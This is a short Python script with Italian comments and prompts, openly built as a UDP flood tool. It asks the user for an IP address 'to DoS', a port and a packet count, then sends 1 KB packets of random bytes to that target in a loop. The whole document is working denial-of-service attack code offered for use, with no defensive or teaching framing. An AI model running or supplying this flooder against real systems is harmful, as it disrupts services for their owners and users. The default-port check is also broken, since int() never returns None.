import socket as so
import random as rdm #per i dati da mettere nei pacchetti

IP_target = input("Inserisci l'indirizzo IP da Dossare\n>>>")
porta_target = int(input("Inserisci la porta del sistema target\n>>>"))
if porta_target == None:
    porta_target = 80

s_UDP = so.socket(so.AF_INET, so.SOCK_DGRAM)
# impostiamo SOCK_DGRAM per il protocollo UDP

pacchetto_UDP = rdm.randbytes(1024)
# creazione di un pacchetto da 1 KB

numero_pacchetti = int(input("Quanti pacchetti vuoi inviare?\n>>>"))

for i in range(numero_pacchetti):
    s_UDP.sendto(pacchetto_UDP, (IP_target, porta_target))
    print (f"Pacchetto inviato all'indirizzo {IP_target} sulla porta {porta_target}")

